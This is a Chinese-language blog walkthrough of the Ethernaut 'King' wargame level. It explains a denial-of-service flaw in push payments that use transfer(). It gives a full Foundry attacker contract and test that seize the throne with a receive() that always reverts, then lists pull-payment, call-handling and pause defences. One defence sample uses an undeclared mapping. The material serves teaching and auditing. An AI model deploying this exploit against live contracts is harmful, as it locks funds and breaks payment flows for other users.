---
title: 'Ethernaut Level 9: King - 拒绝服务攻击'
date: 2025-01-25 15:35:00
updated: 2025-01-25 15:35:00
categories:
  - Ethernaut 系列
  - 基础攻击篇 (1-10)
tags:
  - Ethernaut
  - Foundry
  - 拒绝服务攻击
  - DoS
  - 智能合约安全
  - Solidity
  - 外部调用
series: Ethernaut Foundry Solutions
excerpt: "深入学习拒绝服务攻击和外部调用安全，掌握 King 关卡的攻击技术和防护措施。理解 transfer、send 和 call 的区别及安全风险。"
---

# 🎯 Ethernaut Level 9: King - 拒绝服务攻击

> **关卡链接**: [Ethernaut Level 9 - King](https://ethernaut.openzeppelin.com/level/9)  
> **攻击类型**: 拒绝服务攻击 (DoS)  
> **难度**: ⭐⭐⭐⭐☆

## 📋 挑战目标

谁出资更高的时候，谁就成为 king，目标是让自己成为 king 之后，别人无法夺取王位。换句话说，我们必须成为王者并一直保持国王，然后打破游戏。

![King Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg)

## 🔍 漏洞分析

### transfer() 函数的特性

我们需要理解 `transfer`（现在基本被弃用）是如何在 Solidity 中工作的：
- 如果 `transfer` 失败，此函数抛出错误，但不返回布尔值
- 这意味着如果 `transfer` 失败，交易将恢复
- Gas 限制为 2300，不足以执行复杂逻辑

### 关键漏洞代码

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);  // 易受攻击的点
    king = msg.sender;
    prize = msg.value;
}
```

### 攻击向量

我们可以利用 `transfer()` 函数失败时会回滚的特性：
1. 部署一个合约成为 king
2. 合约不定义 `receive()` 或 `fallback()` 函数
3. 或者在 `receive()` 函数中直接 revert
4. 这样合约将无法接收 ETH，阻止任何人成为新的 king

## 💻 Foundry 实现

### 攻击合约代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/KingFactory.sol";

contract KingAttacker {
    King instance;

    constructor(address payable _king) payable {
        instance = King(_king);
    }

    function attack() public payable {
        (bool success, ) = address(instance).call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // 关键：拒绝接收 ETH
    receive() external payable {
        revert("I will always be the king!");
    }
}

contract KingTest is Test {
    Ethernaut ethernaut;
    KingFactory kingFactory;
    
    function setUp() public {
        ethernaut = new Ethernaut();
        kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);
    }
    
    function testKingExploit() public {
        // 创建关卡实例
        address payable levelInstance = payable(ethernaut.createLevelInstance{value: 1 ether}(kingFactory));
        King instance = King(levelInstance);
        
        // 检查初始状态
        uint256 initialPrize = instance.prize();
        address initialKing = instance._king();
        
        // 部署攻击合约
        KingAttacker attacker = new KingAttacker{value: initialPrize + 1}(levelInstance);
        
        // 执行攻击：成为 king
        attacker.attack{value: initialPrize + 1}();
        
        // 验证攻击成功
        assertEq(instance._king(), address(attacker));
        
        // 尝试有人超越我们（应该失败）
        vm.expectRevert();
        (bool success, ) = levelInstance.call{value: initialPrize + 2}("");
        assertFalse(success);
        
        // 验证我们仍然是 king
        assertEq(instance._king(), address(attacker));
        
        // 这个关卡无法正常提交，因为我们破坏了游戏机制
        // 但这正是关卡想要演示的攻击效果
    }
}
```

### 关键攻击步骤

1. **分析当前 prize**：确定需要多少 ETH 成为 king
2. **部署攻击合约**：合约的 `receive()` 函数会 revert
3. **成为 king**：发送足够的 ETH
4. **锁定王位**：任何后续尝试都会因为 transfer 失败而回滚

```solidity
// 部署攻击合约
KingAttacker attacker = new KingAttacker{value: initialPrize + 1}(levelInstance);

// 发送 ETH 成为 king
attacker.attack{value: initialPrize + 1}();

// 验证攻击成功
assertEq(instance._king(), address(attacker));
```

## 🛡️ 防御措施

### 1. 使用 Pull Payment 模式

```solidity
// ❌ 不安全：Push Payment
contract VulnerableKing {
    address public king;
    uint public prize;
    
    receive() external payable {
        require(msg.value >= prize);
        payable(king).transfer(msg.value);  // 可能失败
        king = msg.sender;
        prize = msg.value;
    }
}

// ✅ 安全：Pull Payment
contract SecureKing {
    address public king;
    uint public prize;
    mapping(address => uint) public pendingWithdrawals;
    
    receive() external payable {
        require(msg.value >= prize);
        
        // 记录待提取金额
        if (king != address(0)) {
            pendingWithdrawals[king] += prize;
        }
        
        king = msg.sender;
        prize = msg.value;
    }
    
    // 让用户自己提取资金
    function withdraw() public {
        uint amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "No funds to withdraw");
        
        pendingWithdrawals[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }
}
```

### 2. 使用 call 并处理失败

```solidity
contract ImprovedKing {
    address public king;
    uint public prize;
    
    receive() external payable {
        require(msg.value >= prize);
        
        // 使用 call 并处理失败
        if (king != address(0)) {
            (bool success, ) = payable(king).call{value: prize}("");
            if (!success) {
                // 记录失败的支付，让用户手动提取
                pendingWithdrawals[king] += prize;
            }
        }
        
        king = msg.sender;
        prize = msg.value;
    }
}
```

### 3. 实现紧急停止机制

```solidity
contract SafeKing {
    address public king;
    uint public prize;
    bool public paused;
    address public owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier whenNotPaused() {
        require(!paused);
        _;
    }
    
    function pause() public onlyOwner {
        paused = true;
    }
    
    function unpause() public onlyOwner {
        paused = false;
    }
    
    receive() external payable whenNotPaused {
        // 正常逻辑
    }
}
```

## 🔧 相关工具和技术

### DoS 攻击检测

```solidity
// 检测合约是否能接收 ETH
function canReceiveEther(address target) public returns (bool) {
    (bool success, ) = target.call{value: 1 wei}("");
    return success;
}
```

### Gas 限制分析

```bash
# 使用 forge 分析 Gas 使用
forge test --gas-report

# 检查 transfer vs call Gas 消耗
cast estimate --value 1000000000000000000 <CONTRACT_ADDRESS> "receive()"
```

## 🎯 总结

**核心概念**:
- `send` 和 `transfer` 现在已被弃用，即使是 `call`，使用时最好按照检查-效果-交互模式调用
- 外部调用必须谨慎使用，必须正确处理错误
- Push Payment 模式容易受到 DoS 攻击

**攻击向量**:
- 通过拒绝接收 ETH 来破坏支付流程
- 利用 `transfer` 失败时的回滚特性
- 成为永久的 king，破坏游戏机制

**防御策略**:
- 使用 Pull Payment 模式
- 正确处理外部调用失败
- 实现紧急停止和恢复机制
- 避免依赖外部调用的成功

---

## 🔗 相关链接

- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**
- **[上一关: Level 8 - Vault](/2025/01/25/ethernaut-level-08-vault/)**
- **[下一关: Level 10 - Re-entrancy](/2025/01/25/ethernaut-level-10-reentrancy/)**
- **[GitHub 项目](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**

